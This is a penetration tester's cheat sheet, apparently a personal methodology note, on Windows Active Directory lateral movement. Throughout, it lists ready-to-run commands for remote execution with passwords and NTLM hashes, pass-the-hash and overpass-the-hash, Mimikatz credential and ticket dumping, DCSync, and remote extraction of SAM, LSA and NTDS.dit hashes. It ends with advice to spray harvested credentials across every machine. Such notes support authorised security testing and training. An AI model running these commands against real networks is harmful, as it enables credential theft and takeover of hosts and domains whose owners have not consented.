# Lateral Movement

## With Password

```bash
# PSExec (admin required, creates service, noisy)
impacket-psexec domain/user:REDACTED
```

```bash
# WMIExec (admin required, stealthier)
impacket-wmiexec domain/user:REDACTED
```

```bash
# Evil-WinRM (needs WinRM port 5985 open)
evil-winrm -i $IP -u user -p password
```

```bash
# RDP
xfreerdp /v:$IP /u:domain\\user /p:REDACTED /cert-ignore +clipboard
```

---

## Pass the Hash (NTLM)

```bash
impacket-psexec domain/user@$IP -hashes :NTLM_HASH
```

```bash
impacket-wmiexec domain/user@$IP -hashes :NTLM_HASH
```

```bash
evil-winrm -i $IP -u user -H NTLM_HASH
```

```bash
nxc smb $IP -u user -H NTLM_HASH
```

```bash
xfreerdp /v:$IP /u:user /pth:REDACTED
```

---

## Overpass the Hash (NTLM to Kerberos Ticket)

```bash
impacket-getTGT domain.local/user -hashes :NTLM_HASH -dc-ip $DC
export KRB5CCNAME=user.ccache
impacket-psexec domain.local/user@target -k -no-pass
```

---

## Mimikatz (On Windows)

```
mimikatz# sekurlsa::logonpasswords
mimikatz# sekurlsa::tickets
mimikatz# lsadump::sam
mimikatz# lsadump::dcsync /user:REDACTED
```

→ [[DCSync]]

---

## Credential Dumping (Remote)

```bash
# Full dump (SAM + LSA + cached)
impacket-secretsdump user:REDACTED
```

```bash
# SAM only
nxc smb $IP -u admin -p password --sam
```

```bash
# LSA only
nxc smb $IP -u admin -p password --lsa
```

```bash
# NTDS.dit (DC only - all domain hashes)
nxc smb $DC -u admin -p password --ntds
```

---

## Next Steps

- Spray every hash/password found across all machines
- Check new creds for admin access: `nxc smb targets.txt -u user -H hash --continue-on-success`
- Feed hashes into [[AD-Methodology]] Phase 3/4
